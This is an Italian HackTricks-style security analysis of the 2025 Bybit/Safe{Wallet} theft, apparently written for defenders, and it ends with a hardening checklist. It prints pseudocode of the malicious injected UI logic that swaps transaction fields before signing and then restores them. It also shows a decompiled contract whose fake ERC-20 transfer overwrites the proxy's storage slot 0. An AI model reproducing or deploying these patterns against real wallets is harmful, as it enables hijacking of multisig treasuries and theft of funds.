# Compromissione del workflow di signing Web3 e takeover del proxy Safe Delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

Una catena di furto da un cold-wallet ha combinato un **compromise della supply-chain della web UI di Safe{Wallet}** con una **primitiva on-chain di delegatecall che sovrascriveva il puntatore all’implementazione di un proxy (slot 0)**. I punti chiave sono:

- Se una dApp può iniettare codice nel signing path, può fare in modo che un signer produca una **firma EIP-712 su campi scelti dall’attaccante**, ripristinando al contempo i dati originali della UI affinché gli altri signer rimangano all’oscuro.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
- I proxy Safe memorizzano `masterCopy` (implementazione) nello **storage slot 0**. Una delegatecall verso un contratto che scrive nello slot 0 di fatto “upgrada” il Safe alla logica dell’attaccante, ottenendo il controllo completo del wallet.<sup>[[3]](#references)</sup>

## Off-chain: mutazione mirata del signing in Safe{Wallet}

Un bundle Safe manomesso (`_app-*.js`) attaccava selettivamente specifici indirizzi Safe + signer. La logica iniettata veniva eseguita immediatamente prima della chiamata di signing:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Proprietà dell'attacco
- **Context-gated**: le allowlist hard-coded per le Safe/firmatari delle vittime hanno evitato il rumore e ridotto il rilevamento.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: i campi (`to`, `data`, `operation`, gas) venivano sovrascritti immediatamente prima di `signTransaction`, poi ripristinati, così i payload delle proposte nell'interfaccia apparivano benigni mentre le firme corrispondevano al payload dell'attaccante.<sup>[[3]](#references)</sup>
- **EIP-712 opacity**: i wallet mostravano dati strutturati, ma non decodificavano il calldata annidato né evidenziavano `operation = delegatecall`, rendendo il messaggio mutato di fatto blind-signed.<sup>[[3]](#references)[[4]](#references)</sup>

### Rilevanza della validazione del Gateway
Le proposte Safe vengono inviate al **Safe Client Gateway**.<sup>[[5]](#references)</sup> Prima dell'introduzione di controlli più rigorosi, il gateway poteva accettare una proposta in cui `safeTxHash`/firma corrispondevano a campi diversi da quelli del corpo JSON, se l'interfaccia li riscriveva dopo la firma. Dopo l'incidente, il gateway rifiuta ora le proposte il cui hash/la cui firma non corrispondono alla transazione inviata.<sup>[[3]](#references)</sup> Una verifica server-side analoga dell'hash dovrebbe essere applicata a qualsiasi API di signing-orchestration.

### Punti salienti dell'incidente Bybit/Safe del 2025
- Il drain del cold wallet di Bybit del 21 febbraio 2025 (~401k ETH) ha riutilizzato lo stesso pattern: un bundle S3 di Safe compromesso si attivava solo per i firmatari Bybit e sostituiva `operation=0` → `1`, impostando `to` sull'attacker contract pre-deployed che scrive nello slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- `_app-52c9031bfa03da47.js`, conservato nella cache di Wayback, mostra la logica basata sulla Safe di Bybit (`0x1db9…cf4`) e sugli indirizzi dei firmatari, poi ripristinata immediatamente a un bundle pulito due minuti dopo l'esecuzione, replicando il trucco “mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- Il contratto malevolo (ad esempio `0x9622…c7242`) conteneva semplici funzioni `sweepETH/sweepERC20` e una `transfer(address,uint256)` che scrive nello slot dell'implementazione. L'esecuzione di `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` ha modificato l'implementazione del proxy e concesso il controllo completo.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover tramite collisione dello slot

I proxy Safe mantengono `masterCopy` nello **storage slot 0** e delegano tutta la logica a esso. Poiché Safe supporta **`operation = 1` (delegatecall)**, qualsiasi transazione firmata può puntare a un contratto arbitrario ed eseguire il suo codice nel contesto di storage del proxy.<sup>[[3]](#references)</sup>

Un contratto dell'attaccante imitava un `transfer(address,uint256)` ERC-20, ma scriveva invece `_to` nello slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Percorso di esecuzione:<sup>[[1]](#references)[[3]](#references)</sup>
1. Le vittime firmano `execTransaction` con `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. masterCopy di Safe valida le firme su questi parametri.
3. Il proxy esegue una delegatecall verso `attackerContract`; il body di `transfer` scrive nello slot 0.
4. Lo slot 0 (`masterCopy`) ora punta a una logica controllata dall'attacker → **presa di controllo completa del wallet e drenaggio dei fondi**.

### Note su guard e versioni (hardening post-incidente)
- I transaction guard sono stati introdotti in Safe v1.3.0 e possono analizzare tutti i parametri di `execTransaction` prima dell'esecuzione; un guard può rifiutare `delegatecall` o applicare policy sulla destinazione e sul calldata. Bybit utilizzava v1.1.1, che precede questo hook.<sup>[[2]](#references)[[6]](#references)</sup>

## Checklist di rilevamento e hardening

- **Integrità della UI**: bloccare gli asset JS / SRI; monitorare le differenze tra i bundle; considerare la signing UI parte del trust boundary.
- **Validazione al momento della firma**: hardware wallet con **EIP-712 clear-signing**; visualizzare esplicitamente `operation` e decodificare il calldata annidato. Rifiutare la firma quando `operation = 1`, a meno che la policy non lo consenta.<sup>[[3]](#references)</sup>
- **Controlli degli hash lato server**: i gateway/servizi che inoltrano le proposte devono ricalcolare `safeTxHash` e verificare che le firme corrispondano ai campi inviati.<sup>[[3]](#references)</sup>
- **Policy/allowlist**: regole di preflight per `to`, selector e tipi di asset, vietando delegatecall salvo nei flow verificati. Richiedere un servizio di policy interno prima di effettuare il broadcasting di transazioni completamente firmate.
- **Progettazione dei contract**: evitare di esporre delegatecall arbitrari nei wallet multisig/treasury, salvo stretta necessità. Trattare qualsiasi implementation pointer come un upgrade primitive: proteggerlo con access control esplicito e applicare guard ai target/selector di delegatecall; spostare il pointer in un altro slot da solo non costituisce una difesa completa.<sup>[[3]](#references)[[6]](#references)</sup>
- **Monitoring**: generare alert sulle esecuzioni di delegatecall da wallet che detengono fondi treasury e sulle proposte che modificano `operation` rispetto ai normali pattern di `call`.

## References

- [1] [Analisi forense di AnChain.AI dell'exploit di Bybit Safe](https://www.anchain.ai/blog/bybit)
- [2] [Analisi di Zero Hour Technology della compromissione del bundle di Safe](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Analisi tecnica approfondita dell'hack di Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)
- [6] [Changelog di Safe smart account v1.3.0 (GitHub)](https://github.com/safe-fndn/safe-smart-account/blob/main/CHANGELOG.md)
{{#include ../../banners/hacktricks-training.md}}
